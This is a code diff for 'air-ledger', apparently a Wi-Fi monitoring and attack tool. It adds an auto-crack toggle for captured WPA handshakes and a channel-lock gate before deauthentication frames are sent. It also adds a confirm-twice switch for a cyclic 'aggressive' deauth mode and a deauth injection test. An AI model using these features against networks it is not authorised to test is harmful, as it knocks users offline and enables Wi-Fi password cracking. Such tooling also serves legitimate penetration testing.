@@ -171,10 +171,19 @@ bool App::init(const std::string& iface, const std::string& db_path) {
         return false;
     }
 
+    Uint32 win_flags = 0;
+    int win_w = WIN_W;
+    int win_h = WIN_H;
+    if (ui_profile_ == UiProfile::Beepy) {
+        win_flags = SDL_WINDOW_FULLSCREEN_DESKTOP;
+        win_w = 0;
+        win_h = 0;
+    } else {
+        win_flags = SDL_WINDOW_RESIZABLE;
+    }
     window_ = SDL_CreateWindow("air-ledger",
                                SDL_WINDOWPOS_UNDEFINED, SDL_WINDOWPOS_UNDEFINED,
-                               0, 0,
-                               SDL_WINDOW_FULLSCREEN_DESKTOP);
+                               win_w, win_h, win_flags);
     if (!window_) {
         std::fprintf(stderr, "[app] SDL_CreateWindow: %s\n", SDL_GetError());
         return false;
@@ -287,6 +296,17 @@ void App::init_handshake(const HandshakeConfig& cfg) {
         std::fprintf(stderr, "[app] handshake capture → %s  wordlists=%zu  auto-crack=%s\n",
                      cfg.capture_dir.c_str(), cfg.wordlists.size(),
                      cfg.auto_crack ? "yes" : "no");
+}
+
+void App::toggle_auto_crack() {
+    if (!handshake_saver_.is_active()) {
+        push_warning("Auto-crack toggle ignored: handshake capture is OFF");
+        return;
+    }
+    bool en = !handshake_saver_.auto_crack_enabled();
+    handshake_saver_.set_auto_crack(en);
+    push_notice(std::string("Auto-crack ") + (en ? "ON" : "OFF"), 4'000'000ULL);
+    std::fprintf(stderr, "[app] auto-crack %s\n", en ? "ENABLED" : "DISABLED");
 }
 
 void App::stop() {
@@ -579,9 +599,19 @@ void App::render_action_bar(int w, int h) {
     else if (graph_view_.hs_list_visible()) left = compact ? "HS: Up/Dn Tab Enter j/Esc" : "HS: Up/Dn/Tab nav  Enter select client  j/Esc close";
     else if (graph_view_.anomaly_log_visible()) left = compact ? "WARN: Up/Dn Tab Enter w/Esc" : "ANOMALY: Up/Dn/Tab nav  Enter select src  w/Esc close";
     else if (graph_view_.event_log_visible()) left = compact ? "LOG: Up/Dn Tab y/Esc" : "EVENT LOG: Up/Dn/Tab nav  y/Esc close";
-    else left = compact ? "Tab nodes  Shift+Up/Down side  Ctrl+Tab side  p/k/j/w/y" : "Tab select AP  Shift+Up/Down sidebar  Ctrl+Tab sidebar-cycle  p/k/j/w/y windows";
+    else {
+        if (compact) {
+            uint32_t phase = (SDL_GetTicks() / 2500) % 3;
+            if (phase == 0) left = "modes: p ap  k crk  j hs";
+            else if (phase == 1) left = "modes: w warn  y log  i help";
+            else left = "Tab nodes  d deauth  Ctrl+d diag  t crack";
+        } else {
+            left = "modes: p=AP  k=CRK  j=HS  w=WARN  y=LOG  i=help  d=deauth  Ctrl+d=diag  t=auto-crack  g=AGG(confirm)";
+        }
+    }
 
-    std::string right = "IF:" + iface_diag_type_
+    std::string right = "AC:" + std::string(handshake_saver_.auto_crack_enabled() ? "on" : "off")
+        + " IF:" + iface_diag_type_
         + " CH:" + (iface_diag_channel_ > 0 ? std::to_string(iface_diag_channel_) : "?")
         + " TX:" + iface_diag_txpower_;
 
@@ -633,7 +663,16 @@ void App::push_notice(const std::string& msg, uint64_t ttl_us) {
 }
 
 void App::add_event_log(const std::string& msg, SDL_Color color) {
-    event_log_.insert(event_log_.begin(), {msg, color});
+    if (!event_log_.empty()) {
+        auto& top = event_log_.front();
+        bool same_color = (top.color.r == color.r && top.color.g == color.g
+            && top.color.b == color.b && top.color.a == color.a);
+        if (same_color && top.text == msg) {
+            if (top.repeats < 999999) ++top.repeats;
+            return;
+        }
+    }
+    event_log_.insert(event_log_.begin(), {msg, color, 1});
     if (event_log_.size() > EVENT_LOG_MAX) event_log_.resize(EVENT_LOG_MAX);
 }
 
@@ -643,18 +682,29 @@ void App::send_deauth(NodeId ap_id) {
     if (!n || n->type != NodeType::AP) return;
 
     const std::string& bssid = n->label;
+    int target_ch = n->channel;
+    update_iface_diagnostics();
 
     // Lock channel BEFORE deauth so the card is on the right channel
     // when the AP sends M1 (the reconnection happens ~100-500ms after deauth).
     // The lock also serialises with the hopper thread via ch_mutex_ in set_channel().
-    if (hopper_ && n->channel > 0) {
+    if (hopper_ && target_ch > 0) {
         if (hopper_->lock_channel(n->channel, n->chan_ht_oper)) {
             deauth_ch_unlock_us_ = now_us() + 5'000'000ULL; // 5 s — enough for full 4-way HS
             std::fprintf(stderr, "[deauth] channel locked to %d for 5s (pre-deauth)\n", n->channel);
         } else {
             push_warning("Channel lock failed for " + bssid + " (ch " + std::to_string(n->channel) + ")");
             std::fprintf(stderr, "[deauth] channel lock FAILED for %s ch=%d\n", bssid.c_str(), n->channel);
+            return;
         }
+    }
+    // Hard channel-control gate before deauth.
+    if (target_ch > 0 && iface_diag_channel_ > 0 && iface_diag_channel_ != target_ch) {
+        push_warning("Deauth blocked: iface ch " + std::to_string(iface_diag_channel_)
+            + " != target ch " + std::to_string(target_ch));
+        std::fprintf(stderr, "[deauth] BLOCKED bssid=%s iface_ch=%d target_ch=%d\n",
+                     bssid.c_str(), iface_diag_channel_, target_ch);
+        return;
     }
 
     if (deauth_engine_ == DeauthEngine::Builtin) {
@@ -689,18 +739,59 @@ void App::send_deauth(NodeId ap_id) {
 }
 
 void App::toggle_aggressive_mode() {
-    aggressive_mode_ = !aggressive_mode_;
+    if (aggressive_mode_) {
+        aggressive_mode_ = false;
+        aggr_arm_until_us_ = 0;
+        aggr_target_label_.clear();
+        push_warning("AGG MODE OFF");
+        std::fprintf(stderr, "[aggr] aggressive mode DISABLED\n");
+        return;
+    }
+
+    uint64_t now = now_us();
+    if (aggr_arm_until_us_ == 0 || now > aggr_arm_until_us_) {
+        aggr_arm_until_us_ = now + 3'000'000ULL;
+        push_warning("Press G again in 3s to enable AGG mode");
+        std::fprintf(stderr, "[aggr] arm requested (press G again to confirm)\n");
+        return;
+    }
+
+    aggr_arm_until_us_ = 0;
+    aggressive_mode_ = true;
     if (aggressive_mode_) {
         aggr_ap_idx_       = 0;
         aggr_next_us_      = 0; // fire immediately on first tick
         aggr_target_label_.clear();
         push_warning("AGG MODE ON — cyclic deauth active");
         std::fprintf(stderr, "[aggr] aggressive mode ENABLED\n");
-    } else {
-        aggr_target_label_.clear();
-        push_warning("AGG MODE OFF");
-        std::fprintf(stderr, "[aggr] aggressive mode DISABLED\n");
     }
+}
+
+void App::run_inject_diagnostics(NodeId ap_id) {
+    const Node* n = graph_.get_node(ap_id);
+    if (!n || n->type != NodeType::AP) return;
+    const std::string bssid = n->label;
+    const int target_ch = n->channel;
+    update_iface_diagnostics();
+    std::fprintf(stderr, "[diag] inject start bssid=%s iface=%s iface_ch=%d target_ch=%d\n",
+                 bssid.c_str(), iface_name_.c_str(), iface_diag_channel_, target_ch);
+    push_notice("Inject diag: start " + bssid, 3'000'000ULL);
+
+    if (hopper_ && target_ch > 0) {
+        if (!hopper_->lock_channel(target_ch, n->chan_ht_oper)) {
+            push_error("Inject diag: channel lock failed");
+            return;
+        }
+    }
+    if (target_ch > 0 && iface_diag_channel_ > 0 && iface_diag_channel_ != target_ch) {
+        push_warning("Inject diag: channel mismatch after lock");
+        return;
+    }
+    std::thread([this, bssid]() {
+        bool ok = DeauthSender::send(iface_name_, bssid, 1);
+        if (ok) push_notice("Inject diag: OK", 4'000'000ULL);
+        else push_error("Inject diag: FAILED");
+    }).detach();
 }
 
 void App::tick_aggressive_mode() {
@@ -1387,7 +1478,11 @@ void App::run() {
                         }
                     } else if (sym == SDLK_d) {
                         NodeId ap_id = graph_view_.ap_list_cursor_node(graph_);
-                        if (ap_id) send_deauth(ap_id);
+                        bool ctrl = (ev.key.keysym.mod & KMOD_CTRL) != 0;
+                        if (ap_id) {
+                            if (ctrl) run_inject_diagnostics(ap_id);
+                            else send_deauth(ap_id);
+                        }
                     }
                 } else if (graph_view_.anomaly_log_visible()) {
                     bool shift = (ev.key.keysym.mod & KMOD_SHIFT) != 0;
@@ -1438,9 +1533,18 @@ void App::run() {
                     }
                     if (sym == SDLK_d) {
                         const Node* sn = graph_.get_node(selected_node);
-                        if (sn && sn->type == NodeType::AP) send_deauth(selected_node);
+                        bool ctrl = (ev.key.keysym.mod & KMOD_CTRL) != 0;
+                        if (sn && sn->type == NodeType::AP) {
+                            if (ctrl) run_inject_diagnostics(selected_node);
+                            else send_deauth(selected_node);
+                        }
                     }
                     if (sym == SDLK_h)      { toggle_channel_hopping(); }
+                    if (sym == SDLK_F11 && ui_profile_ != UiProfile::Beepy) {
+                        Uint32 fl = SDL_GetWindowFlags(window_);
+                        bool fs = (fl & SDL_WINDOW_FULLSCREEN_DESKTOP) != 0;
+                        SDL_SetWindowFullscreen(window_, fs ? 0 : SDL_WINDOW_FULLSCREEN_DESKTOP);
+                    }
                     if (sym == SDLK_l)      { graph_view_.toggle_labels(); }
                     if (sym == SDLK_c) {
                         const Node* sn = graph_.get_node(selected_node);
@@ -1469,6 +1573,7 @@ void App::run() {
                         if (sym == SDLK_r) { ctrl ? reset_iface() : toggle_filter_randomized(); }
                     }
                     if (sym == SDLK_o)      { toggle_filter_probe_only(); }
+                    if (sym == SDLK_t)      { toggle_auto_crack(); }
                     if (sym == SDLK_g)      { toggle_aggressive_mode(); }
                     if (sym == SDLK_e)      { export_json(selected_node); }
                     if (sym == SDLK_SLASH) { start_search(); }
